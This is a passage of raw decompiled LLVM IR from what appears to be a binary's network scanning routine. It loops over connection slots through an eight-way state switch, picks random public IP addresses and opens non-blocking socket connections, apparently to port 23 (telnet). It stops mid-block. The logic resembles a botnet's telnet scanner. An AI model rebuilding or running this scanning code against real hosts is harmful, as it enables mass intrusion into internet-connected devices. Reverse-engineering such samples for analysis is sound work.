  br i1 %v5_804a2ec85, label %dec_label_pc_804a27a.lr.ph, label %dec_label_pc_804a2ee.preheader

dec_label_pc_804a27a.lr.ph:                       ; preds = %entry
  %v2_804a2ab = add i32 %v2_804a245, 20
  br label %dec_label_pc_804a27a

dec_label_pc_804a27a:                             ; preds = %dec_label_pc_804a27a.lr.ph, %dec_label_pc_804a27a
  %storemerge586 = phi i32 [ 0, %dec_label_pc_804a27a.lr.ph ], [ %v4_804a2e3, %dec_label_pc_804a27a ]
  store i32 %storemerge586, i32* %edx.global-to-local, align 4
  %v2_804a286 = mul nuw nsw i32 %storemerge586, 24
  store i32 %v2_804a286, i32* %eax.global-to-local, align 4
  %v3_804a289 = add i32 %v2_804a289, %v2_804a286
  %v4_804a289 = inttoptr i32 %v3_804a289 to i8*
  store i8 1, i8* %v4_804a289, align 1
  store i32 %storemerge586, i32* @ebx, align 4
  %v0_804a291 = load i32, i32* @esp, align 4
  %v1_804a291 = inttoptr i32 %v0_804a291 to i32*
  store i32 1024, i32* %v1_804a291, align 4
  %v1_804a298 = call i32 @malloc(i32 %storemerge586)
  %v0_804a2a2 = load i32, i32* @ebx, align 4
  %v2_804a2a8 = mul i32 %v0_804a2a2, 24
  %v1_804a2ad = add i32 %v2_804a2ab, %v2_804a2a8
  %v2_804a2b0 = inttoptr i32 %v1_804a2ad to i32*
  store i32 %v1_804a298, i32* %v2_804a2b0, align 4
  store i32 %storemerge586, i32* %edx.global-to-local, align 4
  %v2_804a2c1 = add i32 %v2_804a286, %v2_804a245
  %v1_804a2c3 = add i32 %v2_804a2c1, 20
  store i32 %v1_804a2c3, i32* %eax.global-to-local, align 4
  %v1_804a2c6 = inttoptr i32 %v1_804a2c3 to i32*
  %v2_804a2c6 = load i32, i32* %v1_804a2c6, align 4
  store i32 %v2_804a2c6, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804a2cf = load i32, i32* @esp, align 4
  %v2_804a2cf = add i32 %v1_804a2cf, 8
  %v3_804a2cf = inttoptr i32 %v2_804a2cf to i32*
  store i32 1024, i32* %v3_804a2cf, align 4
  %v0_804a2d3 = load i32, i32* @esp, align 4
  %v1_804a2d3 = add i32 %v0_804a2d3, 4
  %v2_804a2d3 = inttoptr i32 %v1_804a2d3 to i32*
  store i32 0, i32* %v2_804a2d3, align 4
  %v0_804a2db = load i32, i32* %edx.global-to-local, align 4
  %v1_804a2db = load i32, i32* @esp, align 4
  %v2_804a2db = inttoptr i32 %v1_804a2db to i32*
  store i32 %v0_804a2db, i32* %v2_804a2db, align 4
  %v3_804a2de = inttoptr i32 %storemerge586 to i8*
  %v4_804a2de = call i32 @__GI_memset(i8* %v3_804a2de, i32 %tmp18, i32 %tmp23)
  %v4_804a2e3 = add nuw nsw i32 %storemerge586, 1
  store i32 %v4_804a2e3, i32* %eax.global-to-local, align 4
  %v5_804a2ec = icmp slt i32 %v4_804a2e3, %.v2_804a1b4
  br i1 %v5_804a2ec, label %dec_label_pc_804a27a, label %dec_label_pc_804a2ee.preheader

dec_label_pc_804a2ee.preheader:                   ; preds = %entry, %dec_label_pc_804a27a
  %v2_804a692 = ptrtoint i32* %stack_var_-172 to i32
  %tmp43 = bitcast i32* %stack_var_-172 to i8*
  %v2_804a6fe = ptrtoint i32* %stack_var_-180 to i32
  %v2_804a75d = ptrtoint i32* %stack_var_-184 to i32
  %v2_804a767 = ptrtoint i32* %stack_var_-188 to i32
  %v2_804a309 = or i32 %v2_804a245, 8
  %v2_804a415 = or i32 %v2_804a245, 11
  %.pre = or i32 %v2_804a245, 10
  %v2_804ab1c = add i32 %v2_804a245, 16
  br label %dec_label_pc_804a2ee

dec_label_pc_804a2ee:                             ; preds = %dec_label_pc_804a2ee, %dec_label_pc_804b759, %dec_label_pc_804a2ee.preheader
  %stack_var_-224.0 = phi i32 [ %tmp17, %dec_label_pc_804a2ee.preheader ], [ %stack_var_-224.0, %dec_label_pc_804a2ee ], [ %stack_var_-224.1, %dec_label_pc_804b759 ]
  %stack_var_-228.0 = phi i32 [ %tmp16, %dec_label_pc_804a2ee.preheader ], [ %stack_var_-228.0, %dec_label_pc_804a2ee ], [ %stack_var_-228.1, %dec_label_pc_804b759 ]
  %stack_var_-232.0 = phi i32 [ %tmp15, %dec_label_pc_804a2ee.preheader ], [ %stack_var_-232.0, %dec_label_pc_804a2ee ], [ %stack_var_-232.1, %dec_label_pc_804b759 ]
  %stack_var_-236.0 = phi i32 [ %tmp14, %dec_label_pc_804a2ee.preheader ], [ %stack_var_-236.0, %dec_label_pc_804a2ee ], [ %stack_var_-236.1, %dec_label_pc_804b759 ]
  %stack_var_-240.0 = phi i32 [ %tmp13, %dec_label_pc_804a2ee.preheader ], [ %stack_var_-240.0, %dec_label_pc_804a2ee ], [ %stack_var_-240.1, %dec_label_pc_804b759 ]
  %stack_var_-244.0 = phi i8* [ %tmp12, %dec_label_pc_804a2ee.preheader ], [ %stack_var_-244.0, %dec_label_pc_804a2ee ], [ %stack_var_-244.1, %dec_label_pc_804b759 ]
  %stack_var_-248.0 = phi i8* [ %tmp11, %dec_label_pc_804a2ee.preheader ], [ %stack_var_-248.0, %dec_label_pc_804a2ee ], [ %stack_var_-248.1, %dec_label_pc_804b759 ]
  %stack_var_-252.0 = phi i8* [ %tmp10, %dec_label_pc_804a2ee.preheader ], [ %stack_var_-252.0, %dec_label_pc_804a2ee ], [ %stack_var_-252.1, %dec_label_pc_804b759 ]
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804a2ec85, label %dec_label_pc_804a2fa, label %dec_label_pc_804a2ee

dec_label_pc_804a2fa:                             ; preds = %dec_label_pc_804a2ee, %dec_label_pc_804b759
  %v1_804a42569 = phi i32 [ %v4_804b759, %dec_label_pc_804b759 ], [ 0, %dec_label_pc_804a2ee ]
  %stack_var_-252.267 = phi i8* [ %stack_var_-252.1, %dec_label_pc_804b759 ], [ %stack_var_-252.0, %dec_label_pc_804a2ee ]
  %stack_var_-248.265 = phi i8* [ %stack_var_-248.1, %dec_label_pc_804b759 ], [ %stack_var_-248.0, %dec_label_pc_804a2ee ]
  %stack_var_-244.263 = phi i8* [ %stack_var_-244.1, %dec_label_pc_804b759 ], [ %stack_var_-244.0, %dec_label_pc_804a2ee ]
  %stack_var_-240.261 = phi i32 [ %stack_var_-240.1, %dec_label_pc_804b759 ], [ %stack_var_-240.0, %dec_label_pc_804a2ee ]
  %stack_var_-236.259 = phi i32 [ %stack_var_-236.1, %dec_label_pc_804b759 ], [ %stack_var_-236.0, %dec_label_pc_804a2ee ]
  %stack_var_-232.257 = phi i32 [ %stack_var_-232.1, %dec_label_pc_804b759 ], [ %stack_var_-232.0, %dec_label_pc_804a2ee ]
  %stack_var_-228.255 = phi i32 [ %stack_var_-228.1, %dec_label_pc_804b759 ], [ %stack_var_-228.0, %dec_label_pc_804a2ee ]
  %stack_var_-224.253 = phi i32 [ %stack_var_-224.1, %dec_label_pc_804b759 ], [ %stack_var_-224.0, %dec_label_pc_804a2ee ]
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  %v2_804a306 = mul nuw nsw i32 %v1_804a42569, 24
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804a309 = add i32 %v2_804a309, %v2_804a306
  %v4_804a309 = inttoptr i32 %v3_804a309 to i8*
  %v5_804a309 = load i8, i8* %v4_804a309, align 8
  %v6_804a309 = zext i8 %v5_804a309 to i32
  store i32 %v6_804a309, i32* %eax.global-to-local, align 4
  store i32 %v6_804a309, i32* %edx.global-to-local, align 4
  %v1_804a32a = mul nuw nsw i32 %v6_804a309, 4
  %v2_804a32a = add nuw nsw i32 %v1_804a32a, 134557324
  %v3_804a32a = inttoptr i32 %v2_804a32a to i32*
  %v4_804a32a = load i32, i32* %v3_804a32a, align 4
  store i32 %v4_804a32a, i32* %eax.global-to-local, align 4
  switch i8 %v5_804a309, label %dec_label_pc_804b759 [
    i8 0, label %dec_label_pc_804a333
    i8 1, label %dec_label_pc_804a64a
    i8 2, label %dec_label_pc_804a96b
    i8 3, label %dec_label_pc_804ab98
    i8 4, label %dec_label_pc_804acfc
    i8 5, label %dec_label_pc_804afa8
    i8 6, label %dec_label_pc_804b10c
    i8 7, label %dec_label_pc_804b443
    i8 8, label %dec_label_pc_804b5e5
  ]

dec_label_pc_804a333:                             ; preds = %dec_label_pc_804a2fa
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  %v2_804a342 = add i32 %v2_804a306, %v2_804a245
  %v1_804a344 = add i32 %v2_804a342, 20
  store i32 %v1_804a344, i32* %eax.global-to-local, align 4
  %v1_804a347 = inttoptr i32 %v1_804a344 to i32*
  %v2_804a347 = load i32, i32* %v1_804a347, align 4
  store i32 %v2_804a347, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804a350 = load i32, i32* @esp, align 4
  %v2_804a350 = add i32 %v1_804a350, 8
  %v3_804a350 = inttoptr i32 %v2_804a350 to i32*
  store i32 1024, i32* %v3_804a350, align 4
  %v0_804a354 = load i32, i32* @esp, align 4
  %v1_804a354 = add i32 %v0_804a354, 4
  %v2_804a354 = inttoptr i32 %v1_804a354 to i32*
  store i32 0, i32* %v2_804a354, align 4
  %v0_804a35c = load i32, i32* %edx.global-to-local, align 4
  %v1_804a35c = load i32, i32* @esp, align 4
  %v2_804a35c = inttoptr i32 %v1_804a35c to i32*
  store i32 %v0_804a35c, i32* %v2_804a35c, align 4
  %v3_804a35f = inttoptr i32 %v6_804a309 to i8*
  %v4_804a35f = call i32 @__GI_memset(i8* %v3_804a35f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804a373 = add i32 %v2_804a289, %v2_804a306
  %v4_804a373 = inttoptr i32 %v3_804a373 to i8*
  %v5_804a373 = load i8, i8* %v4_804a373, align 1
  %v4_804a378 = icmp eq i8 %v5_804a373, 0
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  br i1 %v4_804a378, label %dec_label_pc_804a406, label %dec_label_pc_804a380

dec_label_pc_804a380:                             ; preds = %dec_label_pc_804a333
  store i32 %v1_804a344, i32* %eax.global-to-local, align 4
  %v2_804a394 = load i32, i32* %v1_804a347, align 4
  store i32 %v2_804a342, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804a3b0 = inttoptr i32 %v2_804a342 to i32*
  store i32 0, i32* %v2_804a3b0, align 8
  %v0_804a3b2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a3b2 = add i32 %v0_804a3b2, 4
  store i32 %v1_804a3b2, i32* %eax.global-to-local, align 4
  %v0_804a3b5 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a3b5 = inttoptr i32 %v1_804a3b2 to i32*
  store i32 %v0_804a3b5, i32* %v2_804a3b5, align 4
  %v0_804a3b7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a3b7 = add i32 %v0_804a3b7, 4
  store i32 %v1_804a3b7, i32* %eax.global-to-local, align 4
  %v0_804a3ba = load i32, i32* %edx.global-to-local, align 4
  %v2_804a3ba = inttoptr i32 %v1_804a3b7 to i32*
  store i32 %v0_804a3ba, i32* %v2_804a3ba, align 4
  %v0_804a3bc = load i32, i32* %eax.global-to-local, align 4
  %v1_804a3bc = add i32 %v0_804a3bc, 4
  store i32 %v1_804a3bc, i32* %eax.global-to-local, align 4
  %v0_804a3bf = load i32, i32* %edx.global-to-local, align 4
  %v2_804a3bf = inttoptr i32 %v1_804a3bc to i32*
  store i32 %v0_804a3bf, i32* %v2_804a3bf, align 4
  %v0_804a3c1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a3c1 = add i32 %v0_804a3c1, 4
  store i32 %v1_804a3c1, i32* %eax.global-to-local, align 4
  %v0_804a3c4 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a3c4 = inttoptr i32 %v1_804a3c1 to i32*
  store i32 %v0_804a3c4, i32* %v2_804a3c4, align 4
  %v0_804a3c6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a3c6 = add i32 %v0_804a3c6, 4
  %v0_804a3c9 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a3c9 = inttoptr i32 %v1_804a3c6 to i32*
  store i32 %v0_804a3c9, i32* %v2_804a3c9, align 4
  store i32 %v1_804a344, i32* %edx.global-to-local, align 4
  store i32 %v2_804a394, i32* @eax, align 4
  store i32 %v2_804a394, i32* %v1_804a347, align 4
  store i32 %v1_804a42569, i32* @ebx, align 4
  %v1_804a3e7 = call i32 @getRandomPublicIP(i32 %v2_804a394)
  store i32 %v2_804a245, i32* %edx.global-to-local, align 4
  %v0_804a3f1 = load i32, i32* @ebx, align 4
  %v2_804a3f7 = mul i32 %v0_804a3f1, 24
  %v2_804a3fa = add i32 %v2_804a3f7, %v2_804a245
  %v1_804a3fc = or i32 %v2_804a3fa, 4
  store i32 %v1_804a3fc, i32* %eax.global-to-local, align 4
  %v2_804a3ff = inttoptr i32 %v1_804a3fc to i32*
  store i32 %v1_804a3e7, i32* %v2_804a3ff, align 4
  br label %dec_label_pc_804a4b3

dec_label_pc_804a406:                             ; preds = %dec_label_pc_804a333
  %v3_804a415 = add i32 %v2_804a415, %v2_804a306
  %v4_804a415 = inttoptr i32 %v3_804a415 to i8*
  %v5_804a415 = load i8, i8* %v4_804a415, align 1
  %v2_804a41a = load i32, i32* @ebx, align 4
  %v2_804a41c = add i8 %v5_804a415, 1
  %v14_804a41c = zext i8 %v2_804a41c to i32
  %v16_804a41c = and i32 %v2_804a41a, -256
  %v17_804a41c = or i32 %v16_804a41c, %v14_804a41c
  store i32 %v17_804a41c, i32* @ebx, align 4
  store i8 %v2_804a41c, i8* %v4_804a415, align 1
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v5_804a43d = load i8, i8* %v4_804a415, align 1
  %v6_804a43d = zext i8 %v5_804a43d to i32
  store i32 %v6_804a43d, i32* %eax.global-to-local, align 4
  %v10_804a442 = icmp eq i8 %v5_804a43d, 10
  %v1_804a444 = icmp eq i1 %v10_804a442, false
  br i1 %v1_804a444, label %dec_label_pc_804a406.dec_label_pc_804a482_crit_edge, label %dec_label_pc_804a446

dec_label_pc_804a406.dec_label_pc_804a482_crit_edge: ; preds = %dec_label_pc_804a406
  %.pre7 = add i32 %.pre, %v2_804a306
  %.pre8 = inttoptr i32 %.pre7 to i8*
  br label %dec_label_pc_804a482

dec_label_pc_804a446:                             ; preds = %dec_label_pc_804a406
  store i8 0, i8* %v4_804a415, align 1
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804a469 = add i32 %.pre, %v2_804a306
  %v4_804a469 = inttoptr i32 %v3_804a469 to i8*
  %v5_804a469 = load i8, i8* %v4_804a469, align 2
  %v2_804a46e = load i32, i32* @ebx, align 4
  %v2_804a470 = add i8 %v5_804a469, 1
  %v14_804a470 = zext i8 %v2_804a470 to i32
  %v16_804a470 = and i32 %v2_804a46e, -256
  %v17_804a470 = or i32 %v16_804a470, %v14_804a470
  store i32 %v17_804a470, i32* @ebx, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  store i8 %v2_804a470, i8* %v4_804a469, align 2
  br label %dec_label_pc_804a482

dec_label_pc_804a482:                             ; preds = %dec_label_pc_804a406.dec_label_pc_804a482_crit_edge, %dec_label_pc_804a446
  %v4_804a491.pre-phi = phi i8* [ %.pre8, %dec_label_pc_804a406.dec_label_pc_804a482_crit_edge ], [ %v4_804a469, %dec_label_pc_804a446 ]
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v5_804a491 = load i8, i8* %v4_804a491.pre-phi, align 1
  %v6_804a491 = zext i8 %v5_804a491 to i32
  store i32 %v6_804a491, i32* %eax.global-to-local, align 4
  %v10_804a496 = icmp eq i8 %v5_804a491, 3
  %v1_804a498 = icmp eq i1 %v10_804a496, false
  br i1 %v1_804a498, label %dec_label_pc_804a482.dec_label_pc_804a4b3_crit_edge, label %dec_label_pc_804a49a

dec_label_pc_804a482.dec_label_pc_804a4b3_crit_edge: ; preds = %dec_label_pc_804a482
  %.pre9 = inttoptr i32 %v2_804a342 to i32*
  br label %dec_label_pc_804a4b3

dec_label_pc_804a49a:                             ; preds = %dec_label_pc_804a482
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804a373, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804a4b3:                             ; preds = %dec_label_pc_804a482.dec_label_pc_804a4b3_crit_edge, %dec_label_pc_804a380
  %v3_804a543.pre-phi = phi i32* [ %.pre9, %dec_label_pc_804a482.dec_label_pc_804a4b3_crit_edge ], [ %v2_804a3b0, %dec_label_pc_804a380 ]
  store i32 2, i32* %stack_var_-204, align 4
  %v0_804a4bc = load i32, i32* @esp, align 4
  %v1_804a4bc = inttoptr i32 %v0_804a4bc to i32*
  store i32 23, i32* %v1_804a4bc, align 4
  %v0_804a4c3 = load i32, i32* %stack_var_-204, align 4
  %v1_804a4c3 = trunc i32 %v0_804a4c3 to i16
  %v2_804a4c3 = call i32 @htons(i16 %v1_804a4c3)
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  %v1_804a4f9 = or i32 %v2_804a342, 4
  store i32 %v1_804a4f9, i32* %eax.global-to-local, align 4
  %v1_804a4fc = inttoptr i32 %v1_804a4f9 to i32*
  %v2_804a4fc = load i32, i32* %v1_804a4fc, align 4
  store i32 %v2_804a4fc, i32* %eax.global-to-local, align 4
  store i32 %v1_804a42569, i32* @ebx, align 4
  %v0_804a507 = load i32, i32* @esp, align 4
  %v1_804a507 = add i32 %v0_804a507, 8
  %v2_804a507 = inttoptr i32 %v1_804a507 to i32*
  store i32 0, i32* %v2_804a507, align 4
  %v0_804a50f = load i32, i32* @esp, align 4
  %v1_804a50f = add i32 %v0_804a50f, 4
  %v2_804a50f = inttoptr i32 %v1_804a50f to i32*
  store i32 1, i32* %v2_804a50f, align 4
  %v0_804a517 = load i32, i32* @esp, align 4
  %v1_804a517 = inttoptr i32 %v0_804a517 to i32*
  store i32 2, i32* %v1_804a517, align 4
  %sext = mul i32 %v2_804a4c3, 65536
  %v3_804a51e = sdiv i32 %sext, 65536
  %v4_804a51e = call i32 @socket(i32 %v3_804a51e, i32 %v2_804a4fc, i32 0)
  %v0_804a528 = load i32, i32* @ebx, align 4
  %v2_804a52e = mul i32 %v0_804a528, 24
  %v3_804a531 = add i32 %v2_804a52e, %v2_804a245
  %v4_804a531 = inttoptr i32 %v3_804a531 to i32*
  store i32 %v4_804a51e, i32* %v4_804a531, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a543 = load i32, i32* %v3_804a543.pre-phi, align 4
  store i32 %v4_804a543, i32* %eax.global-to-local, align 4
  %v10_804a546 = icmp eq i32 %v4_804a543, -1
  br i1 %v10_804a546, label %dec_label_pc_804b759, label %dec_label_pc_804a54f

dec_label_pc_804a54f:                             ; preds = %dec_label_pc_804a4b3
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a55e = load i32, i32* %v3_804a543.pre-phi, align 4
  store i32 %v4_804a55e, i32* %eax.global-to-local, align 4
  %v0_804a561 = load i32, i32* @esp, align 4
  %v1_804a561 = add i32 %v0_804a561, 8
  %v2_804a561 = inttoptr i32 %v1_804a561 to i32*
  store i32 0, i32* %v2_804a561, align 4
  %v0_804a569 = load i32, i32* @esp, align 4
  %v1_804a569 = add i32 %v0_804a569, 4
  %v2_804a569 = inttoptr i32 %v1_804a569 to i32*
  store i32 3, i32* %v2_804a569, align 4
  %v0_804a571 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a571 = load i32, i32* @esp, align 4
  %v2_804a571 = inttoptr i32 %v1_804a571 to i32*
  store i32 %v0_804a571, i32* %v2_804a571, align 4
  %v3_804a574 = call i32 @__libc_fcntl(i32 %v2_804a4fc, i32 0, i32 0)
  %v1_804a57b = or i32 %v3_804a574, 2048
  store i32 %v1_804a57b, i32* @ebx, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a590 = load i32, i32* %v3_804a543.pre-phi, align 4
  store i32 %v4_804a590, i32* %eax.global-to-local, align 4
  %v1_804a593 = load i32, i32* @esp, align 4
  %v2_804a593 = add i32 %v1_804a593, 8
  %v3_804a593 = inttoptr i32 %v2_804a593 to i32*
  store i32 %v1_804a57b, i32* %v3_804a593, align 4
  %v0_804a597 = load i32, i32* @esp, align 4
  %v1_804a597 = add i32 %v0_804a597, 4
  %v2_804a597 = inttoptr i32 %v1_804a597 to i32*
  store i32 4, i32* %v2_804a597, align 4
  %v0_804a59f = load i32, i32* %eax.global-to-local, align 4
  %v1_804a59f = load i32, i32* @esp, align 4
  %v2_804a59f = inttoptr i32 %v1_804a59f to i32*
  store i32 %v0_804a59f, i32* %v2_804a59f, align 4
  %v3_804a5a2 = call i32 @__libc_fcntl(i32 %v2_804a4fc, i32 0, i32 0)
  store i32 %v2_804a200, i32* @ebx, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a5bc = load i32, i32* %v3_804a543.pre-phi, align 4
  store i32 %v4_804a5bc, i32* %eax.global-to-local, align 4
  %v0_804a5bf = load i32, i32* @esp, align 4
  %v1_804a5bf = add i32 %v0_804a5bf, 8
  %v2_804a5bf = inttoptr i32 %v1_804a5bf to i32*
  store i32 16, i32* %v2_804a5bf, align 4
  %v1_804a5c7 = load i32, i32* @esp, align 4
  %v2_804a5c7 = add i32 %v1_804a5c7, 4
  %v3_804a5c7 = inttoptr i32 %v2_804a5c7 to i32*
  store i32 %v2_804a200, i32* %v3_804a5c7, align 4
  %v0_804a5cb = load i32, i32* %eax.global-to-local, align 4
  %v1_804a5cb = load i32, i32* @esp, align 4
  %v2_804a5cb = inttoptr i32 %v1_804a5cb to i32*
  store i32 %v0_804a5cb, i32* %v2_804a5cb, align 4
  %v3_804a5ce = call i32 @__libc_connect(i32 %v2_804a4fc, i32 0, i32 0)
  store i32 %v3_804a5ce, i32* %eax.global-to-local, align 4
  %v10_804a5d3 = icmp eq i32 %v3_804a5ce, -1
  %v1_804a5d6 = icmp eq i1 %v10_804a5d3, false
  br i1 %v1_804a5d6, label %dec_label_pc_804a617, label %dec_label_pc_804a5d8

dec_label_pc_804a5d8:                             ; preds = %dec_label_pc_804a54f
  %v1_804a5d8 = call i32 @__errno_location(i32 %v2_804a4fc)
  store i32 %v1_804a5d8, i32* %eax.global-to-local, align 4
  %v1_804a5dd = inttoptr i32 %v1_804a5d8 to i32*
  %v2_804a5dd = load i32, i32* %v1_804a5dd, align 4
  store i32 %v2_804a5dd, i32* %eax.global-to-local, align 4
  %v9_804a5df = icmp eq i32 %v2_804a5dd, 115
  br i1 %v9_804a5df, label %dec_label_pc_804a617, label %dec_label_pc_804a5e4

dec_label_pc_804a5e4:                             ; preds = %dec_label_pc_804a5d8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a5f3 = load i32, i32* %v3_804a543.pre-phi, align 4
  store i32 %v4_804a5f3, i32* %eax.global-to-local, align 4
  %v1_804a5f6 = load i32, i32* @esp, align 4
  %v2_804a5f6 = inttoptr i32 %v1_804a5f6 to i32*
  store i32 %v4_804a5f3, i32* %v2_804a5f6, align 4
  %v1_804a5f9 = call i32 @sclose(i32 %v2_804a4fc)
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804a373, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804a617:                             ; preds = %dec_label_pc_804a5d8, %dec_label_pc_804a54f
  store i8 1, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  %v1_804a63c = add i32 %v2_804a342, 12
  store i32 %v1_804a63c, i32* %eax.global-to-local, align 4
  %v1_804a63f = inttoptr i32 %v1_804a63c to i32*
  store i32 0, i32* %v1_804a63f, align 4
  br label %dec_label_pc_804b759

dec_label_pc_804a64a:                             ; preds = %dec_label_pc_804a2fa
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  %v2_804a659 = add i32 %v2_804a306, %v2_804a245
  %v1_804a65b = add i32 %v2_804a659, 12
  store i32 %v1_804a65b, i32* %eax.global-to-local, align 4
  %v1_804a65e = inttoptr i32 %v1_804a65b to i32*
  %v2_804a65e = load i32, i32* %v1_804a65e, align 4
  store i32 %v2_804a65e, i32* %eax.global-to-local, align 4
  %v1_804a660 = icmp eq i32 %v2_804a65e, 0
  %v1_804a662 = icmp eq i1 %v1_804a660, false
  br i1 %v1_804a662, label %dec_label_pc_804a688, label %dec_label_pc_804a664

dec_label_pc_804a664:                             ; preds = %dec_label_pc_804a64a
  store i32 %v1_804a42569, i32* @ebx, align 4
  %v0_804a667 = load i32, i32* @esp, align 4
  %v1_804a667 = inttoptr i32 %v0_804a667 to i32*
  store i32 0, i32* %v1_804a667, align 4
  %v1_804a66e = inttoptr i32 %v6_804a309 to i32*
  %v2_804a66e = call i32 @__GI_time(i32* %v1_804a66e)
  store i32 %v2_804a245, i32* %edx.global-to-local, align 4
  %v0_804a678 = load i32, i32* @ebx, align 4
  %v2_804a67e = mul i32 %v0_804a678, 24
  %v2_804a681 = add i32 %v2_804a67e, %v2_804a245
  %v1_804a683 = add i32 %v2_804a681, 12
  store i32 %v1_804a683, i32* %eax.global-to-local, align 4
  %v2_804a686 = inttoptr i32 %v1_804a683 to i32*
  store i32 %v2_804a66e, i32* %v2_804a686, align 4
  br label %dec_label_pc_804a688

dec_label_pc_804a688:                             ; preds = %dec_label_pc_804a64a, %dec_label_pc_804a664
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804a692, i32* @edi, align 4
  %v5_804a699 = call i8* @_memset(i8* %tmp43, i32 0, i32 32)
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804a6b0 = inttoptr i32 %v2_804a659 to i32*
  %v4_804a6b0 = load i32, i32* %v3_804a6b0, align 8
  %v2_804a6b5 = udiv i32 %v4_804a6b0, 32
  store i32 %v2_804a6b5, i32* @ebx, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a6c7 = load i32, i32* %v3_804a6b0, align 8
  %v1_804a6ca = urem i32 %v4_804a6c7, 32
  store i32 %v1_804a6ca, i32* %eax.global-to-local, align 4
  %v0_804a6cd = load i32, i32* @ebp, align 4
  %v2_804a6cd = mul nuw nsw i32 %v2_804a6b5, 4
  %v3_804a6cd = add nsw i32 %v2_804a6cd, -168
  %v4_804a6cd = add i32 %v3_804a6cd, %v0_804a6cd
  %v5_804a6cd = inttoptr i32 %v4_804a6cd to i32*
  %v6_804a6cd = load i32, i32* %v5_804a6cd, align 4
  %v9_804a6cd = shl i32 1, %v1_804a6ca
  %v12_804a6cd = or i32 %v6_804a6cd, %v9_804a6cd
  store i32 %v12_804a6cd, i32* %v5_804a6cd, align 4
  store i32 0, i32* %stack_var_-180, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a6f8 = load i32, i32* %v3_804a6b0, align 8
  %v1_804a6fb = add i32 %v4_804a6f8, 1
  store i32 %v1_804a6fb, i32* %edx.global-to-local, align 4
  %v1_804a704 = load i32, i32* @esp, align 4
  %v2_804a704 = add i32 %v1_804a704, 16
  %v3_804a704 = inttoptr i32 %v2_804a704 to i32*
  store i32 %v2_804a6fe, i32* %v3_804a704, align 4
  %v0_804a708 = load i32, i32* @esp, align 4
  %v1_804a708 = add i32 %v0_804a708, 12
  %v2_804a708 = inttoptr i32 %v1_804a708 to i32*
  store i32 0, i32* %v2_804a708, align 4
  store i32 %v2_804a692, i32* %eax.global-to-local, align 4
  %v1_804a716 = load i32, i32* @esp, align 4
  %v2_804a716 = add i32 %v1_804a716, 8
  %v3_804a716 = inttoptr i32 %v2_804a716 to i32*
  store i32 %v2_804a692, i32* %v3_804a716, align 4
  %v0_804a71a = load i32, i32* @esp, align 4
  %v1_804a71a = add i32 %v0_804a71a, 4
  %v2_804a71a = inttoptr i32 %v1_804a71a to i32*
  store i32 0, i32* %v2_804a71a, align 4
  %v0_804a722 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a722 = load i32, i32* @esp, align 4
  %v2_804a722 = inttoptr i32 %v1_804a722 to i32*
  store i32 %v0_804a722, i32* %v2_804a722, align 4
  %v0_804a725 = load i32, i32* %stack_var_-180, align 4
  %v2_804a725 = load i32, i32* %stack_var_-172, align 4
  %v5_804a725 = call i32 @__libc_select(i32 %v0_804a725, i32 10000, i32 %v2_804a725, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804a725, i32* %eax.global-to-local, align 4
  %v12_804a72d = icmp eq i32 %v5_804a725, 1
